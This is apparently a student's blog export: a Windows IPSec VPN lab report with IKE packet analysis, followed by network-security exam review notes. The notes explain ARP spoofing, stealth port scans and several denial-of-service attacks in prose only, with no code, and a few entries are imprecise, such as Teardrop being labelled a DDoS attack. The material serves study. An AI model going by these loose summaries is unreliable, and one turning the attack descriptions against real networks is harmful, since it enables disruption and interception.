<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img14.png" alt="图14"></p>
<p><strong>第二阶段：密钥交换阶段，主要交换密钥Diffie-Hellman公共值。数据包中的Key Exchange用于交换各自加密生成的主密钥；Nonce使用了随机数，防止重放攻击；加密所用的密钥为ipsec中设定的预共享密钥；NAT-D为双方的ip+端口的Hash值。</strong></p>
<p>③包3：发送DH公共值和Nonce随机值</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img15.png" alt="图15"></p>
<p>④包4：生成随机数，返回随机数和DH公共值</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img16.png" alt="图16"></p>
<p><strong>第三阶段：ID信息和认证数据交换，进行身份认证，对第一阶段交换内容的认证。</strong></p>
<p>⑤包5：发送预共享密钥，发起身份验证</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img17.png" alt="图17"></p>
<p>⑥包6：回应预共享密钥，验证身份</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img18.png" alt="图18"></p>
<p>（2）IPSec SA</p>
<p><strong>IPSec SA建立分为两个阶段，都是加密数据，无法查看。用到了Quick-Mode，目的是在两个对等体间协商一组一致的参数来创建IPSec SA，用于真实数据的加解密，并且在此进行PFS，PFS及在Quick-Mode重新做DH的交换，产生新的密钥用于IPSec数据的加密。</strong></p>
<p>⑦包7：协商封装方式、加密算法等。此时主机1发至主机2。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img19.png" alt="图19"></p>
<p>Initiator cookie和Responder cookie：仍使用上个阶段的cookie。</p>
<p>Exchange Type：Quick Mode表示IPSec协商阶段只有快速模式。</p>
<p>Encrypted Data：加密的内容，包括协商用的封装方式、加密算法、生存时间和感兴趣流等。</p>
<p>⑧包8：相应包7内信息，同意传输</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img20.png" alt="图20"></p>
<p>Commit：确认收到发送方的通信。</p>
<p>至此，双方都已确认，后面开始正式通信。</p>
<p>⑨包9：确认报文</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img21.png" alt="图21"></p>
<p>⑩包10：确认报文</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img22.png" alt="图22"></p>
<p>3.IKE SA和IPSec SA建立过程的理论图：</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img23.jpg" alt="图23"></p>
<p>4.总结IKE Sec和IPSec SA</p>
<p>IKE（Internet Key Exchange）和IPSec（Internet Protocol Security）是用于在网络通信中实现安全性的协议套件。它们通常一起使用，以确保数据的保密性、完整性和身份验证。在了解IKE和IPSec之前，让我们先了解一下两个重要的概念：SA（Security Association）和ISAKMP（Internet Security Association and Key Management Protocol）。</p>
<p>（1）安全关联（Security Association - SA）：SA是在通信双方之间建立的安全参数集合，用于保护通信。它包括了安全性协议的参数，如加密算法、认证算法、密钥生命周期等。对于每个通信方向，都存在一个SA。</p>
<p>（2）ISAKMP（Internet Security Association and Key Management Protocol）：ISAKMP 是一种协议，用于在通信双方之间建立和管理安全关联。它定义了在两个对等体之间协商安全性参数的步骤。</p>
<p>5.讨论IKE和IPSec SA的建立过程</p>
<p><strong>IKE（Internet Key Exchange）：</strong></p>
<p>（1）阶段一（Phase 1）：在这个阶段，IKE首先确立一个安全的通信通道，这个通道称为ISAKMP SA。通信双方协商使用的加密和认证算法，并交换密钥。主要目标是建立一个安全的通信通道，以便在接下来的阶段中交换IPSec SA 的相关信息。</p>
<p>（2）阶段二（Phase 2）：在这个阶段，使用ISAKMP SA建立的安全通道，通信双方协商 IPsec SA 的参数。这包括通信所使用的加密算法、认证算法、密钥生命周期等。当IPsec SA被建立后，通信双方就可以在安全通道上传输加密的数据。</p>
<p><strong>IPSec SA（Security Association）：</strong></p>
<p>（1）初始化：通信双方使用已经建立的ISAKMP SA来协商IPsec SA的参数。这些参数包括加密算法、认证算法、散列算法等。</p>
<p>（2）协商：通信双方协商各自的安全关联，包括源和目标IP地址，以及使用的加密和认证算法。</p>
<p>（3）建立：通过ISAKMP SA建立的安全通道，通信双方交换IPsec SA的相关信息，从而建立安全通信通道。</p>
<p>（4）维护：定期更新密钥和安全关联参数，以确保通信的安全性和完整性。</p>
<p>总体而言，IKE和IPSec通过阶段一和阶段二的协商过程，以及使用ISAKMP SA和IPsec SA，确保了网络通信的安全性。这包括了密钥的安全协商、数据的加密和认证。</p>
<h4 id="步骤四：配置专用的IPSec安全策略"><a href="#步骤四：配置专用的IPSec安全策略" class="headerlink" title="步骤四：配置专用的IPSec安全策略"></a>步骤四：配置专用的IPSec安全策略</h4><p>1.除了利用windows内置的IPSec安全策略外，我们还可以自己定制专用的IPSec安全策略。右击“IP安全策略，在本地计算机”，选择“创建IP安全策略”则弹出IP安全策略向导界面。一直点击下一步，清除“激活默认响应规则”。最后就到了“完成 IP规则向导”，选中“编辑属性”后点击完成。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img24.png" alt="图24"></p>
<p>2.在弹出的创建IP安全规则向导窗口中，点击“添加”，会依次设置：隧道方式（默认“此规则不知道隧道”），网络类型（默认“所有网络连接”），身份验证方法如图所示，我们选择采用预共享密钥的 方式进行身份认证，在这里我们设置一个简单的密钥111，点击 “下一步”。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img25.png" alt="图25"></p>
<p>3.下面进入IP筛选器列表的配置项，在这项里设置哪些地址和网络协议的数据包使用IPSec安全连接。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img26.png" alt="图26"></p>
<p>4.这里将“我的IP地址”作为源地址，选择“任何IP地址”作为目标地址。在“选择协议类型”中选中“任意”。 点击“下一步”，则完成IP筛选器编辑。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img27.png" alt="图27"></p>
<p>5.完成“新IP筛选器列表”的建立后，点击“下一步”，编辑这个筛选器列表的操作，“筛选器列表的操作”是指当有IP数据包符合筛选器中定义的条件时，IPSec对符合条件的数据包如何处理，如何操作。添加一条筛选器操作，点击“添加”，会出现IP筛选器操作向导，点击“下一步”，直到选择筛选器操作常规选项，即对于符合筛选器列表中定义的数据包，将如何处理，选中“协商安全”，让其进行IPSec安全协商。选中“不和不支持IPSec的计算机通讯”，以要求必须在IPSec基础上进行连接，点击“下一步”。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img28.png" alt="图28"></p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img29.png" alt="图29"></p>
<p>6.决定进行通信过程中是否加密和完整性检验，为了更加清楚这其中采用的协议，选择“自定义”然后点击“设置”。可以看到AH和ESP协议的不同功能，即AH协议不进行加密，而ESP可进行加密和完整性检验，相关算法也都可以选择，点击确定即完成了IP筛选器操作向导。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img30.png" alt="图30"></p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img31.png" alt="图31"></p>
<p>7.筛选器操作完成后，下面我们可以看到新建立的筛选器操作名称，点击“下一步”，即完成了新增IP安全规则向导的设置，我们会看到新增加的安全规则，包括新IP筛选器列表、新筛选器操作等。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img32.png" alt="图32"></p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img33.png" alt="图33"></p>
<p>8.对另一台虚拟机做同样配置。之后通过ping测试在建立安全的IPSec连接之前，是否会协商建立相互通讯时共享的安全参数及验证的密钥。</p>
<p><img src="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/img34.png" alt="图34"></p>
<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>本次VPN实验，我首次完整地实践了IPSec VPN的配置与分析全过程。在Windows系统上手动配置IPSec策略时，我深刻体会到理论参数与实际配置的差异，最初由于身份验证方法设置不一致，导致安全联盟建立失败，经过反复比对教材中的协议流程，最终发现是预共享密钥的格式问题。这个调试过程让我明白，协议标准中的每一个参数都需要在配置中精确对应，任何细微差别都会影响整个VPN隧道的建立。</p>
<p>在抓包分析环节，我使用Wireshark捕获了完整的IKE协商过程。通过分析报文序列，我清晰地观察到主模式交换的消息：策略协商，DH密钥交换，身份验证。特别是在第二阶段快速模式中，我注意到IPSec SA的协商完全在已加密的IKE SA保护下进行，这生动展现了”嵌套安全”的设计理念。最让我印象深刻的是，通过对比抓包数据中的SPI值变化，我直观地理解了安全参数索引在数据包分流和解密中的关键作用。</p>
<p>这次实验不仅巩固了课堂所学的知识，更让我认识到理论协议如何转化为实际可用的安全服务。特别是在分析报文时看到加密前后的载荷格式变化，让我对ESP封装的实际效果有了具象认知。未来在进行网络安全设计时，我会更注重协议细节的精确实现，因为本次实验证明，正是这些细节决定了安全机制的有效性。</p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>网络安全实验</category>
      </categories>
      <tags>
        <tag>北邮</tag>
        <tag>实验</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全终极预测</title>
    <url>/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="网络安全终极预测——LHL"><a href="#网络安全终极预测——LHL" class="headerlink" title="网络安全终极预测——LHL"></a>网络安全终极预测——LHL</h1><p>授课：郑康锋</p>
<h1 id="填空题、选择题必背（红色历年考过的）"><a href="#填空题、选择题必背（红色历年考过的）" class="headerlink" title="填空题、选择题必背（红色历年考过的）"></a>填空题、选择题必背（红色历年考过的）</h1><p>1.信息安全保障的PDRR模型的内涵：<strong>保护、检测、响应、恢复。</strong></p>
<p>2.攻击类型：<strong>阻断、截取、篡改、伪造</strong></p>
<p>3.网络信息安全服务：<strong>机密性、完整性、可用性、可审性。</strong></p>
<p>4.被动攻击：<strong>传输报文泄露、通信流量分析</strong>。</p>
<p>5.SQL注入基本流程：<strong>寻找注入点、信息采集、权限判断、攻击系统</strong></p>
<p>6.DNS查询有两种：<strong>递归查询（客户机和服务器之间）、迭代查询（服务器之间）。</strong></p>
<p>7.因特网的域名系统被设计成一个<strong>联机分布式数据库系统</strong>，并且采用<strong>分层树状结构</strong>的命名方法。</p>
<p>8.网络扫描分为以下三个步骤：<strong>发现目标主机或网络、进一步搜集目标信息（端口扫描、服务识别、操作系统探测）、漏洞检测。</strong></p>
<p>9.端口扫描技术分类：<strong>全连接扫描、半连接扫描、秘密扫描</strong></p>
<p>（1）全连接扫描技术：<strong>TCP connect()扫描</strong></p>
<p>（2）半连接扫描技术：<strong>TCP SYN扫描</strong></p>
<p>（3）秘密扫描：是一种不被<strong>审计工具</strong>所检测的端口扫描技术，有<strong>TCP FIN、TCP ACK、TCP NULL和TCP XMAS扫描、TCP分段扫描。</strong>其中<strong>TCP ACK</strong>扫描无法获得目标主机端口开放情况。</p>
<p>（4）端口扫描某服务器，若发现53号端口开放，则该服务器可能开放的服务是<strong>DNS；</strong>若发现23号端口开放，则该服务器可能开放的服务是<strong>Telnet；</strong>若发现21号端口开放，则该服务器可能开放的服务是<strong>FTP</strong>。</p>
<p>10.服务器检测到Dos攻击，若攻击数据包里面源IP和目的IP相同，则该Dos攻击可能为<strong>Land攻击；</strong>若服务器接收到大量的ICMP-Echo-Reply响应包，则该Dos攻击可能为<strong>Smurf攻击；</strong>若服务器上面出现大量的TCP半连接，则该Dos攻击可能为<strong>SYN Flood攻击</strong></p>
<p>11.防火墙访问控制包括三个要素：<strong>主体、客体、控制策略。</strong></p>
<p>12.防火墙安全策略的指定规范：<strong>最小特权原则、最小泄漏原则、多级安全策略。</strong></p>
<p>13.两种访问控制模型：<strong>自主访问控制模型DAC、强制访问控制模型MAC</strong></p>
<p>14.自主访问控制模型DAC一般采用<strong>访问控制矩阵</strong>和<strong>访问控制列表</strong>来存放不同主体的访问控制信息。</p>
<p>15.强制访问控制模型MAC中考虑到偏序关系，主体对客体的访问主要有四种方式：<strong>向下读、向上读、向下写、向上写。</strong></p>
<p>16.MAC模型中的几种主要模型有：<strong>Lattice模型、BLP模型、Biba模型。</strong></p>
<p>（1）<strong>Lattice模型</strong>适合需要对信息资源进行明显分类的系统</p>
<p>（2）Bell-LaPadula（BLP）模型<strong>无上读、无下写，</strong>强调信息的<strong>机密性而忽略了信息完整性</strong>。</p>
<p>（3）Biba模型<strong>禁止向上写，没有向下读。</strong></p>
<p>17.MAC对访问主体和客体标识两个安全标记：<strong>具有偏序关系的安全等级标记、非等级分类标记。</strong></p>
<p>18.防火墙功能：<strong>内容过滤，用户认证，VPN，应用程序代理，访问控制，IDS与报警，NAT，日志</strong></p>
<p>19.防火墙分类</p>
<p>（1）从形态上分类：<strong>软件防火墙、硬件防火墙</strong></p>
<p>（2）从实现技术分类：<strong>包过滤防火墙、应用网关防火墙、代理防火墙、状态检测防火墙、电路级网关</strong></p>
<p>（3）从部署位置分类：<strong>主机防火墙、网络防火墙</strong></p>
<p>20.防火墙访问控制方法（复方用心）：<strong>服务控制、方向控制、用户控制、行为控制</strong></p>
<p>21.包过滤防火墙针对以下信息判断：<strong>基本信息(协议ip端口等)、协议具体信息、数据流向和接口信息。</strong></p>
<p>22.状态检测防火墙是在动态包过滤防火墙基础上加上<strong>状态检测</strong>机制形成的。</p>
<p>23.网络地址翻译（NAT）目的：<strong>解决IP地址空间不足问题、向外界隐藏内部网结构</strong></p>
<p>24.NAT方式：<strong>M-1多个内部网地址翻译到1个IP地址、1-1简单的地址翻译、M-N多个内部网地址翻译到N个IP地址池。</strong></p>
<p>25.地址翻译NAT类型：<strong>静态NAT</strong>（内部网络每个主机<strong>都永久映射</strong>成外部合法的地址）、<strong>NAT池</strong>（外部网络定义了一系列合法地址，采用<strong>动态分配的方式</strong>映射到<strong>内部网络</strong>）、<strong>端口NAT（PNAT）</strong>（<strong>内部地址映射到外部网络</strong>的一个IP地址的不同端口上）</p>
<p>26.防火墙的三种体系结构：<strong>双重宿主主机体系、屏蔽主机体系结构、屏蔽子网体系结构</strong></p>
<p>27.防火墙体系架构中<strong>屏蔽子网体系架构</strong>相对来说是入侵者最难攻破的。该体系架构中的主要组成部分：<strong>外部路由器、堡垒主机、内部路由器</strong>。其中<strong>堡垒主机</strong>是整个架构的核心。</p>
<p>28.入侵检测的分类</p>
<p>（1）根据原始数据的来源：基于<strong>主机</strong>、基于<strong>网络</strong></p>
<p>（2）根据检测原理：<strong>异常入侵检测、误用入侵检测</strong></p>
<p>（3）根据体系结构：<strong>集中式、等级式、协作式</strong></p>
<p>（4）根据工作方式分类：<strong>离线检测、在线检测</strong></p>
<p>29.基于主机系统结构（HIDS）检测的目标：<strong>主机系统、系统本地用户</strong></p>
<p>30.基于网络系统结构（NIDS）依据以下内容检测入侵：<strong>网络流量、协议分析、单台或多台主机的审计数据</strong>。</p>
<p>31.常用入侵检测模型：<strong>Dennning模型</strong></p>
<p>（1）CIDF：<strong>事件产生器、事件分析器、响应单元、事件数据库</strong>。</p>
<p>（2）Denning模型：<strong>主体、对象、审计记录、活动档案、异常记录、活动规则。</strong></p>
<p>32.基于异常的入侵检测的检测原理是：<strong>正常行为的特征轮廓、检测系统运行情况、是否偏离预设门限</strong>。其常用检测算法是<strong>统计分析。</strong></p>
<p>33.基于误用入侵检测的原理：<strong>根据已知系统或软件的漏洞来检测入侵行为。</strong>常用的检测算法有<strong>专家系统，模型推理，状态转换分析，完整性分析</strong>。</p>
<p>34.端到端数据通路存在泄露的地方：<strong>拨入段链路上、ISP接入设备上、在因特网上、在安全网关上、在企业内部网上。</strong></p>
<p>35.VPN中公用网络包括：<strong>IP网络、帧中继网络和ATM网络</strong>。</p>
<p>36.VPN组成：<strong>VPN服务器、VPN连接、VPN客户机</strong></p>
<p>37.VPN的实现要求：支持<strong>数据分组的透明传输</strong>、支持<strong>安全功能</strong>、提供<strong>服务质量</strong>保证</p>
<p>38.隧道技术实际是一种<strong>数据封装</strong>，将一种协议X封装在另外一种协议Y中，从而实现协议X对公用传输网络(采用协议Y)的透明性。隧道协议的组成：<strong>乘客协议</strong>、<strong>封装协议</strong>、<strong>运载协议</strong></p>
<p>39.根据网络类型的差异，可以将VPN分为<strong>Client-LAN、LAN-LAN</strong></p>
<p>40.VPN的定义：依靠<strong>ISP或其它NSP</strong>在公用网络基础设施之上构建的专用的数据通信网络。特点：<strong>封闭的用户群，安全性高，服务质量有保证</strong>。VPN功能：<strong>数据机密性保护、数据完整性保护、数据源身份认证、重放攻击保护</strong></p>
<p>41.PPTP和L2TP协议都是<strong>数据链路层</strong>安全协议，其中PPTP协议要求互联网必须为<strong>IP网络</strong>。L2TP协议体系主要由<strong>LAC和LNS构成</strong>。</p>
<p>42.IPSec协议（IP层安全协议）</p>
<p>（1）解决的问题：<strong>数据源身份认证、数据完整性、数据保密、重放攻击保护、自动的密钥管理和安全关联管理（比一般vpn多出来的）</strong></p>
<p>（2）体系结构：<strong>AH和ESP协议</strong></p>
<p>（3）AH协议只有<strong>认证功能</strong>；ESP协议<strong>有认证和加密功能</strong>（AH：<strong>认证头</strong>、ESP：<strong>封装安全有效载荷</strong>）；安全关联SA：<strong>规定协议的安全参数</strong></p>
<p>43.记住两种模式：<strong>传输模式和隧道模式</strong></p>
<p>44.安全关联SA里面有：<strong>密钥数值，序列号，IPsec实施类型</strong>等参数。</p>
<p>45.IKE（互联网密钥交换）</p>
<p>（1）阶段一交换实现模式：<strong>身份保护模式（主模式）、野蛮模式</strong>。</p>
<p>（2）主模式：提供了<strong>身份保护机制</strong>，经过三个步骤，共交换了六条消息。</p>
<p>三个步骤分别是：<strong>策略协商交换、DH共享值及nonce交换、身份验证交换</strong></p>
<p>（3）野蛮模式：分为三个步骤，但<strong>只交换三条消息，</strong>头一条消息<strong>协商策略</strong>，交换DH公开值必需的辅助数据以及身份信息；第二条消息<strong>认证响应方</strong>；第三条消息<strong>认证发起方</strong>，并为发起方提供在场的证据。</p>
<p>三个步骤：<strong>策略协商和Diffie-Hellman公开值交换、响应方身份验证和Diffie-Hellman公开值交换</strong>、<strong>发起方身份验证</strong></p>
<p>（4）主模式和野蛮模式都允许4种不同的验证方法：<strong>预共享密钥、DSS数字签名、RSA数字签名、交换加密</strong></p>
<p>（5）阶段二使用快速模式，分为三个步骤，交换三条消息。步骤：<strong>发起快速模式、响应快速模式、确认快速模式</strong></p>
<p>（6）IKE协议的作用是：<strong>在通信双方之间通过协商建立SA</strong></p>
<p>（7）IKE密钥交换第一阶段的目的是：在通信双方之间建立一对<strong>ISAKMP SA</strong>，进而建立一条安全的通信信道。</p>
<p>（8）第二阶段的目的是：在通信双方之间建立<strong>IPSec SA</strong></p>
<p>46.SSL的目标：提供<strong>保密性和完整性</strong>(身份认证)</p>
<p>47.SSL特性：<strong>互操作性、可扩展性、相对效率</strong></p>
<p>48.SSL协议体系</p>
<p>（1）底层：<strong>SSL记录协议</strong></p>
<p>（2）上层：<strong>SSL握手协议、SSL密码变化协议、SSL警告协议、http</strong></p>
<p>49.SSL数据封装过程：<strong>分块、压缩、计算MAC、加密、增加SSL记录头</strong></p>
<p>50.PGP为<strong>电子邮件、文件存储应用</strong>提供了<strong>认证和保密性</strong>服务</p>
<p>51.PGP功能：<strong>数字签名、消息加密、压缩、邮件兼容性、数据分段</strong></p>
<p>52.邮件数据处理顺序：<strong>签名、压缩、加密</strong></p>
<p>53.压缩在签名之后的目的是：<strong>便于使用多种压缩算法</strong></p>
<p>54.加密在压缩之后的目的是：<strong>减少消息的冗余量，使得加密强度更大，密码分析难度变大</strong></p>
<p>55.PGB使用四种类型的密钥：<strong>一次性会话传统密钥、公钥、私钥、基于口令短语的传统密钥</strong></p>
<p>56.私钥环是被<strong>用户口令</strong>加密的，存储属于本节点的<strong>公钥&#x2F;私钥对</strong></p>
<p>57.公钥环：存储本节点所知道的<strong>其他用户的公钥</strong></p>
<h1 id="大题必背（红色考过）"><a href="#大题必背（红色考过）" class="headerlink" title="大题必背（红色考过）"></a>大题必背（红色考过）</h1><p>1.请说出ARP欺骗的原理和ARP欺骗的每个步骤。</p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/c300f583-f0d9-4b89-83fa-df2c6f7536c8.png" alt="image.png"></p>
<p>（1）ARP是地址解析协议，用于<strong>将ip地址解析成mac地址</strong>。</p>
<p>（2）ARP欺骗是利用<strong>修改主机上的ARP缓存表以达到嗅探的目的</strong>，是一种中间人攻击。</p>
<p>（3）主机C要对主机A和主机B进行ARP欺骗，要向主机A和主机B分别发送ARP响应包，告诉它们IP地址为IPA的主机的MAC地址为MACC，ip地址为IPB的主机的MAC地址为MACC，这样主机A和主机B的ARP缓存表上就会有IPA-MACC和IPB-MACC的记录，它们之间发送的消息都会发送给主机C。</p>
<p>（4）攻击者<strong>可以拦截目标设备和网关之间的所有数据流量</strong>。根据攻击者的意图，他们<strong>可以选择透明地转发数据</strong>（使受害者不知情），或者修改数据。</p>
<p>（5）不过<strong>ARP缓存表会动态更新</strong>，主机C在监听过程中需要不断发送ARP响应包。</p>
<p><strong>2.简要说说全连接扫描（TCP connect）</strong></p>
<p>TCP connect<strong>扫描完成整个TCP连接过程</strong>，利用connect()系统调用，<strong>对目标计算机的每个端口进行连接</strong>。如果端口处于侦听状态，那么connect()就能成功；否则，该端口是不能用的，即没有提供服务。</p>
<p>优点：<strong>快速，不用权限</strong>可以打开多个套接字，加速扫描</p>
<p>缺点：<strong>不隐蔽，防火墙容易过滤</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/1379a491-e34e-4f48-b283-7109579ce064.png" alt="image.png"></p>
<p><strong>3.简要说说半连接扫描（TCP SYN扫描）</strong></p>
<p>向目标特定端口<strong>发送一个SYN报文</strong>，根据目标主机返回的数据包，只要<strong>辨别报文中是含有SYN+ACK标志还是RST标志</strong>，就能够知道目标的相应端口是处于监听还是关闭状态。</p>
<p>优点：<strong>快速、效率高；隐蔽，</strong>一般不会再目标计算机留下记录。</p>
<p>缺点：<strong>需要root权限构造SYN包</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/7f652755-ad1a-497b-8a6b-7e611b3c8ab3.png" alt="image.png"></p>
<p><strong>4.简要说说秘密扫描，并列举几个秘密扫描</strong></p>
<p>秘密扫描技术是一种<strong>不被审计工具所检测</strong>的端口扫描技术</p>
<p>现有的秘密扫描技术有<strong>TCP FIN，TCP ACK，TCP NULL，TCP XMAS，TCP分段扫描</strong>。其中TCP ACK扫描无法获得目标主机端口开放情况。</p>
<p>（1）TCP FIN：<strong>SYN不够秘密</strong>，会被防火墙、包过滤器监视；<strong>但是FIN可能会没有任何麻烦的通过</strong>，因为他不在三次握手中。原理：关闭的端口会用适当的RST来回复FIN数据包，打开的端口会忽略对FIN数据包的回应。</p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image.png" alt="image.png"></p>
<p>（2）TCP ACK：TCP ACK扫描利用的是标志位ACK，但不是用于确定目标打开了哪些端口，<strong>用于检测防火墙。</strong></p>
<p>（3）TCP NULL和TCP XMAS扫描：是FIN扫描的两个变种。<strong>NULL扫描向目标发送一个所有标志位都置为0的报文，而XMAS扫描则向目标发送一个URG&#x2F;PSH&#x2F;FIN报文</strong>，如果目标的相应端口是关闭的话，应该会收到一个RST数据包，否则就不会收到来自目标的任何回应。</p>
<p>缺点：通常适用于UNIX&#x2F;Linux目标主机；<strong>需要root权限</strong></p>
<p>优点：<strong>隐蔽性好</strong></p>
<p>（4）TCP分段扫描：<strong>并不直接发送TCP探测数据包，而是将数据包分成两个较小的IP段。</strong>这样就将一个TCP头分成好几个数据包，从而包过滤器很难探测到。</p>
<p>优点：<strong>隐蔽性好</strong>，可穿越防火墙</p>
<p>缺点：<strong>可能被丢弃</strong>；某些程序处理小数据包会发生异常</p>
<p><strong>5.Teardrop是什么类型的攻击，详细描述攻击的原理（TCP）</strong></p>
<p>DDOS攻击。</p>
<p>（1）<strong>MTU是最大的传输单元，大的数据包再传输时需要分段</strong>，Teardrop就是<strong>根据分割重组之间的漏洞向目标机器发送损坏的IP包</strong>，如重叠的包或者过大的载荷包，通过TCP&#x2F;IP协议栈中分片重组代码中的bug来瘫痪各种不同的操作系统。</p>
<p>（2）这样，接收方重组时数据包<strong>长度过大甚至为负数</strong>，造成溢出。</p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/f6334392-6ea8-4a21-a435-f0421b4422b5.png" alt="image.png"></p>
<p><strong>6.简要说说ping of Death(ICMP)攻击</strong></p>
<p>早期的操作系统在处理ICMP数据包时只分配了64kb的缓冲区来存放收到的数据包，攻击者可以在ICMP数据包之后<strong>附加非常多的冗余信息</strong>，使得数据包大小超过65535字节，<strong>这样接收方获取数据包时会发生栈溢出，导致系统崩溃。</strong></p>
<p><strong>7.简要说说LAND攻击</strong></p>
<p>攻击者<strong>发送一个构造好的SYN数据包</strong>，该包的<strong>起始地址和接收地址都是目标机器的IP地址</strong>，这样目标机器接收到该数据包，<strong>会向自身发送一个SYN ACK数据包</strong>，<strong>接着再向自身发送ACK数据包并创建一个空连接，目标主机每收到这样一个SYN数据包都会创建这样一个空连接，</strong>且保留，直到超时。</p>
<p><strong>8.简要说说SYN Flood攻击</strong></p>
<p>（1）每个机器都<strong>需要为半连接分配一定的资源</strong>，<strong>这种半连接的数量是有限制的。</strong></p>
<p>（2）攻击者<strong>利用TCP协议的三次握手过程</strong>，打开大量的半连接。（不可达）</p>
<p>（3）<strong>接收方产生大量的半连接</strong>，不能再接受新的TCP连接。（速度差）</p>
<p>（4）难以跟踪，<strong>因为源地址往往不可信，而且不在线。</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%201.png" alt="image.png"></p>
<p><strong>9.简要说说Smurf攻击</strong></p>
<p>（1）攻击者向广播地址发送<strong>ICMP Echo</strong>请求，并且将请求源地址设为目标主机的地址</p>
<p>（2）<strong>广播地址所在网络的所有主机会相应ICMP请求</strong>，向目标主机发送ICMP Echo-Reply应答。<strong>目标主机被这些应答淹没。</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%202.png" alt="image.png"></p>
<p><strong>10.简要说说HTTP洪水</strong></p>
<p><strong>用HTTP GET FLOOD反复请求服务器上的资源文件，大量消耗服务器上的资源，导致服务器崩溃。</strong>不仅仅针对<strong>web服务</strong>，还可以因为HTTP请求造成<strong>大量数据库查询</strong>，造成数据库停止响应，系统负载升高，服务器宕机。</p>
<p>11.简要说说CC攻击</p>
<p><strong>攻击者操控某些主机不停发送大量数据包给对方服务器，服务器资源耗尽、宕机崩溃。</strong></p>
<p>特点：真实度高；检测困难；防御困难</p>
<p>如何检测CC攻击：一般遭受CC攻击时，Web服务器会出现80端口对外关闭的DDoS攻击现象；在命令行中输入netstat-an，若查看80端口大量雷同的连接记录，则基本判定被CC攻击了</p>
<p><strong>12.请说说DNS欺骗原理与过程</strong></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%203.png" alt="image.png"></p>
<p><img src="/2025/12/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BB%88%E6%9E%81%E9%A2%84%E6%B5%8B/image%204.png" alt="image.png"></p>
